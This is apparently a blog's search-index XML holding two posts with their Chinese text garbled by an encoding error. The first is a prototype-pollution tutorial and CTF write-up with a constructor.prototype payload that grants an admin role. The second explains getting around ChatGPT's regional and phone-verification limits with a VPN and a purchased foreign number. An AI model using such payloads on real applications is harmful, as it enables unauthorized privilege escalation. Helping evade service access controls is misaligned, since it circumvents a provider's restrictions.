<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>åŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹"></a> ç®€ä»‹</h3><h4 id="javascriptåŸå‹"><a class="markdownIt-Anchor" href="#javascriptåŸå‹"></a> javascriptåŸå‹</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age,gender</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">gender</span>=gender;<br>&#125;<br><br><span class="hljs-keyword">var</span> person=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;male&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person)<br></code></pre></td></tr></table></figure><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.jpg" class=""><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" class=""><p>personæ˜¯ä¸€ä¸ªPersonç±»çš„å®ä¾‹ï¼Œæœ‰å››ä¸ªå±æ€§ï¼šnameã€ageã€genderã€protoã€‚å…¶ä¸­ï¼Œå‰ä¸‰ä¸ªæ˜¯æˆ‘ä»¬æ„å»ºå‡½æ•°ä¸­å®šä¹‰çš„ï¼Œç¬¬4ä¸ªå±æ€§protoå°±æ˜¯Person.prototypeã€‚</p><p>å½“æˆ‘ä»¬è®¿é—®personçš„ä¸€ä¸ªå±æ€§æ—¶,æµè§ˆå™¨é¦–å…ˆæŸ¥æ‰¾personæ˜¯å¦æœ‰è¿™ä¸ªå±æ€§.å¦‚æœæ²¡æœ‰,ç„¶åæµè§ˆå™¨å°±ä¼šåœ¨personçš„protoä¸­æŸ¥æ‰¾è¿™ä¸ªå±æ€§(ä¹Ÿå°±æ˜¯Person.prototype)ã€‚å¦‚æœPerson.prototypeæœ‰è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªå±æ€§å°±ä¼šè¢«ä½¿ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœPerson.prototypeæ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œæµè§ˆå™¨å°±ä¼šå»æŸ¥æ‰¾Person.prototypeçš„protoï¼Œçœ‹å®ƒæ˜¯å¦æœ‰è¿™ä¸ªå±æ€§ï¼Œä¾æ¬¡ç±»æ¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç±»çš„åŸå‹å±æ€§çš„protoéƒ½æ˜¯Object.prototypeã€‚</p><h4 id="åŸå‹å¼ç»§æ‰¿"><a class="markdownIt-Anchor" href="#åŸå‹å¼ç»§æ‰¿"></a> åŸå‹å¼ç»§æ‰¿</h4><p>javascriptç»§æ‰¿éƒ½æ˜¯ç”±åŸå‹é“¾æ¥å®ç°çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Teacher</span>(<span class="hljs-params">name,age,gender,subject</span>)&#123;<br><span class="hljs-title class_">Person</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>,name);<br><span class="hljs-title class_">Person</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>,age);<br><span class="hljs-title class_">Person</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>,gender);<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">subject</span>=subject;<br>&#125;<br><span class="hljs-title class_">Teacher</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//ç»§æ‰¿</span><br><span class="hljs-keyword">var</span> teacher=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(teacher);<br></code></pre></td></tr></table></figure><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.jpg" class=""><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png" class=""><h4 id="åŸå‹é“¾"><a class="markdownIt-Anchor" href="#åŸå‹é“¾"></a> åŸå‹é“¾</h4><p>JavaScript åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ã€‚æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆobjectï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong>ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong>ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>proto</strong>ï¼‰ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><h4 id="åŸå‹é“¾æ±¡æŸ“"><a class="markdownIt-Anchor" href="#åŸå‹é“¾æ±¡æŸ“"></a> åŸå‹é“¾æ±¡æŸ“</h4><p>åœ¨JavaScriptå‘å±•å†å²ä¸Šï¼Œå¾ˆå°‘æœ‰çœŸæ­£çš„ç§æœ‰å±æ€§ï¼Œç±»çš„æ‰€æœ‰å±æ€§éƒ½å…è®¸è¢«å…¬å¼€çš„è®¿é—®å’Œä¿®æ”¹ï¼ŒåŒ…æ‹¬protoï¼Œæ„é€ å‡½æ•°å’ŒåŸå‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥å…¶ä»–å€¼æ¥è¦†ç›–æˆ–æ±¡æŸ“è¿™äº›protoï¼Œæ„é€ å‡½æ•°å’ŒåŸå‹å±æ€§ã€‚ç„¶åï¼Œæ‰€æœ‰ç»§æ‰¿äº†è¢«æ±¡æŸ“åŸå‹çš„å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“ã€‚åŸå‹é“¾æ±¡æŸ“é€šå¸¸ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ã€ç¯¡æ”¹ç¨‹åºæ‰§è¡Œæµç¨‹ã€å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»£ç ç­‰æ¼æ´ã€‚å»ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ä¸­çš„å±æ€§ï¼Œå»å½±å“åˆ°æ–°å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œä½¿å…¶å¸¦ä¸Šäº†æˆ‘ä»¬ç»™å¯¹è±¡åŸå‹æ·»åŠ çš„å±æ€§ï¼Œè¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“<br />åŸå‹é“¾æ±¡æŸ“çš„å‘ç”Ÿä¸»è¦æœ‰ä¸¤ç§åœºæ™¯ï¼šä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶å’ŒæŒ‰è·¯å¾„å®šä¹‰å±æ€§ã€‚</p><h3 id="ä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶"><a class="markdownIt-Anchor" href="#ä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶"></a> ä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶</h3><p>å®šä¹‰ä¸€ä¸ªé€’å½’åˆå¹¶å‡½æ•°merge()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">target, source</span>) =&gt; &#123;<br>  <span class="hljs-comment">// Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(source)) &#123;<br>    <span class="hljs-keyword">if</span> (source[key] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>) <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(source[key], <span class="hljs-title function_">merge</span>(target[key], source[key]))<br>  &#125;<br>  <span class="hljs-comment">// Join `target` and modified `source`</span><br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(target || &#123;&#125;, source)<br>  <span class="hljs-keyword">return</span> target<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age,gender</span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">gender</span>=gender;<br>&#125;<br><span class="hljs-keyword">let</span> newperson=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;test1&quot;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&quot;male&quot;</span>);<br><span class="hljs-keyword">let</span> job=<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&#x27;</span>);<br><span class="hljs-title function_">merge</span>(newperson,job);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å½’å¹¶æ—¶</p><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.jpg" class=""><p>æœ‰å½’å¹¶</p><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.jpg" class=""><p>åªæœ‰ä¸å®‰å…¨çš„é€’å½’åˆå¹¶å‡½æ•°æ‰ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œéé€’å½’çš„ç®—æ³•æ˜¯ä¸ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“çš„ï¼Œä¾‹å¦‚JavaScriptè‡ªå¸¦çš„Object.assignã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age,gender</span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">gender</span>=gender;<br>&#125;<br><span class="hljs-keyword">let</span> person1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;test1&quot;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&quot;male&quot;</span>);<br><span class="hljs-keyword">let</span> job=<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&#x27;</span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(person1,job);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.jpg" class=""><p>å› ä¸ºObject.assignåœ¨åˆå¹¶æ—¶ï¼Œå¯¹äºç®€å•ç±»å‹çš„å±æ€§å€¼å¾—åˆ°çš„æ˜¯æ·±æ‹·è´ï¼Œå¦‚stringï¼Œnumberã€‚å¦‚æœå±æ€§å€¼æ˜¯å¯¹è±¡æˆ–å…¶ä»–å¼•ç”¨ç±»å‹ï¼Œåˆ™æ˜¯æµ…æ‹·è´ã€‚ä¸Šé¢ä¾‹å­ä¸­çš„protoå°±æ˜¯ä¸€ä¸ªæµ…æ‹·è´ï¼Œåˆå¹¶åpersonçš„åŸå‹åªæ˜¯æŒ‡å‘äº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå³{â€œxâ€: 1}ï¼ŒPerson.prototypeæ²¡æœ‰å—åˆ°å½±å“ã€‚</p><h3 id="åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨"><a class="markdownIt-Anchor" href="#åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨"></a> åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨</h3><p>ä¸€èˆ¬æ˜¯ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">merge<br><span class="hljs-built_in">clone</span><br></code></pre></td></tr></table></figure><p>ä»¥merge ä¸ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>       <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>           <span class="hljs-title function_">merge</span>(target[key], source[key])<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>           target[key] = source[key]<br>      &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br>o1<br>o2<br>o3=&#123;&#125;<br>o3<br></code></pre></td></tr></table></figure><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/8.png" class=""><p>å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰o1æœ‰äº†b çš„å±æ€§ï¼Œç„¶è€Œé‡æ–°å®šä¹‰o3åˆæ²¡æœ‰äº†</p><p>åŸå› ï¼šåˆ›å»ºo2çš„æ—¶å€™ï¼Œ<code>__proto__</code>å·²å°†ä»£è¡¨äº†o2çš„åŸå‹ï¼Œæ­¤æ—¶å»éå†o2çš„æ‰€æœ‰é”®åæ‹¿åˆ°çš„å€¼æ˜¯[a,b]ï¼Œè€Œ<code>__proto__</code>å¹¶æ²¡æœ‰ä½œä¸ºé”®åè¢«èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶æ²¡æœ‰ä¿®æ”¹Objectçš„åŸå‹ã€‚</p><p>ä½¿ç”¨jsonè§£æå¯ä»¥è®©<code>__proto__</code>å½“æˆé”®åè§£æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(o1, o2)<br>o1<br>o3 = &#123;&#125;<br>o3<br></code></pre></td></tr></table></figure><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/9.png" class=""><img src="/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/10.png" class=""><p>JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><h3 id="hgame-2023-week4-shared-diary"><a class="markdownIt-Anchor" href="#hgame-2023-week4-shared-diary"></a> HGAME 2023 Week4 Shared Diary</h3><p>[è·å–æºä»£ç ](<a href="https://github.com/fru1ts/fru1ts.github.io/tree/main/2023/02/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Shared">https://github.com/fru1ts/fru1ts.github.io/tree/main/2023/02/08/åŸå‹é“¾æ±¡æŸ“/Shared</a> Diary.zip)</p><p>ç”¨ä¸€é“é¢˜ä½“éªŒä¸€ä¸‹ï¼Œè¿™é‡ŒåªåšåŸå‹é“¾æ±¡æŸ“è¿™éƒ¨åˆ†</p><p>æœ‰ä¸€ä¸ªmergeå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-comment">// Prevent prototype pollution</span><br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Detected Prototype Pollution&quot;</span>)<br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„mergeè¿˜è¿‡æ»¤äº†<code>__proto__</code>,å¯ä»¥ç”¨constructor.prototypeä»£æ›¿</p><p>æ‰¾ä¸€ä¸‹ç”¨åˆ°mergeçš„åœ°æ–¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        <span class="hljs-comment">// save userinfo to session</span><br>        <span class="hljs-keyword">let</span> data = &#123;&#125;;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;login&quot;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)<br>        &#125;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data<br><br>        <span class="hljs-comment">// check password</span><br>        <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>        user.<span class="hljs-property">password</span> = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>        <span class="hljs-keyword">if</span> (user.<span class="hljs-property">password</span>=== <span class="hljs-string">&quot;testpassword&quot;</span>) &#123;<br>            user.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (user.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;login&quot;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)<br>        &#125; <br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;&quot;</span>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦role=admin,ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§éœ€è¦çŸ¥é“å¯†ç ï¼Œæ˜¾ç„¶ä¸è¡Œï¼Œå¦ä¸€ç§å°±æ˜¯åŸå‹é“¾æ±¡æŸ“äº†</p><p>payload:<code>&#123;constructor:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;111&quot;,&quot;password&quot;:&quot;123&quot;&#125;</code></p><p>æœ‰ä¸ªå°å‘å°±æ˜¯è¯·æ±‚å¤´è¦æ”¹æˆ<code>Content-Type: application/json</code></p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#åŸºäºåŸå‹é“¾çš„ç»§æ‰¿</a></em></p><p><em><a href="https://www.freebuf.com/articles/web/275619.html">https://www.freebuf.com/articles/web/275619.html</a></em></p><p><em><a href="https://www.freebuf.com/articles/web/264966.html">https://www.freebuf.com/articles/web/264966.html</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ChatGPTå›½å†…è®¿é—®</title>
    <link href="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/"/>
    <url>/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å›½å¤–çš„ChatGPTç©å¾—éå¸¸ç«çˆ†ï¼Œå……åˆ†ä½“ç°äº†AIæ™ºèƒ½çš„å¼ºå¤§é­…åŠ›</p><p>ChatGPTæ˜¯ç”±ç¾å›½äººå·¥æ™ºèƒ½ç ”ç©¶å®éªŒå®¤OpenAIåœ¨2022å¹´11æœˆ30æ—¥å‘å¸ƒçš„å…¨æ–°èŠå¤©æœºå™¨äººæ¨¡å‹ï¼Œä¸€æ¬¾äººå·¥æ™ºèƒ½æŠ€æœ¯é©±åŠ¨çš„è‡ªç„¶è¯­è¨€å¤„ç†å·¥å…·ã€‚å®ƒèƒ½å¤Ÿé€šè¿‡å­¦ä¹ å’Œç†è§£äººç±»çš„è¯­è¨€æ¥è¿›è¡Œå¯¹è¯ï¼Œè¿˜èƒ½æ ¹æ®èŠå¤©çš„ä¸Šä¸‹æ–‡è¿›è¡Œäº’åŠ¨ï¼ŒçœŸæ­£åƒäººç±»ä¸€æ ·æ¥èŠå¤©äº¤æµï¼Œç”šè‡³èƒ½å®Œæˆæ’°å†™é‚®ä»¶ã€è§†é¢‘è„šæœ¬ã€æ–‡æ¡ˆã€ç¿»è¯‘ã€ä»£ç ç­‰ä»»åŠ¡ã€‚</p><p>å¯æƒœè¯¥é¡¹ç›®å´ä¸å¯¹å›½å†…å¼€æ”¾ğŸ˜­</p><p>æ‰€ä»¥è®°ä¸€ç¯‡å›½å†…ç”¨æˆ·å¦‚ä½•ä½“éªŒChatGPT</p><p>é¦–å…ˆéœ€è¦å€ŸåŠ©æ¢¯å­æ‰èƒ½è®¿é—®åˆ°ç½‘ç«™</p><img src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/1.png" class=""><p>ç„¶åå°±æ˜¯ç‚¹å‡»<code>Sign up</code>æ³¨å†Œï¼šå¡«å†™é‚®ç®±ï¼Œé‚®ç®±éªŒè¯</p><p>æ¥ç€å¼€å§‹å‡ºç°é—®é¢˜ï¼šéœ€è¦æ‰‹æœºå·ç éªŒè¯ï¼Œè€Œè¯¥åº”ç”¨å¯¹å›½å†…æ‰‹æœºå·ä¸æ”¯æŒğŸ¤®</p><img src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/2.png" class=""><p>è¿™é‡Œå¯ä»¥æ³¨å†Œä¸€ä¸ª<a href="https://sms-activate.org/">æµ·å¤–çš„æ‰‹æœºå·ç </a></p><p>å…ˆæ³¨å†Œï¼Œå†å……å€¼ä¸ª0.2$å°±å¤Ÿäº†ï¼Œå¤§æ¦‚1.43ï¿¥</p><p>ç»•åæœç´¢openAI</p><img src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/3.png" class=""><p>å¯ä»¥æ³¨å†Œä¸€ä¸ªå·´è¥¿çš„</p><img src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/4.png" class=""><p>å°†ç”µè¯å·ç å¡«åˆ°æ³¨å†Œçš„åœ°æ–¹ï¼Œç„¶å<code>Send code via SMS</code></p><p>å›åˆ°è´­ä¹°æ‰‹æœºå·ç çš„åœ°æ–¹</p><img 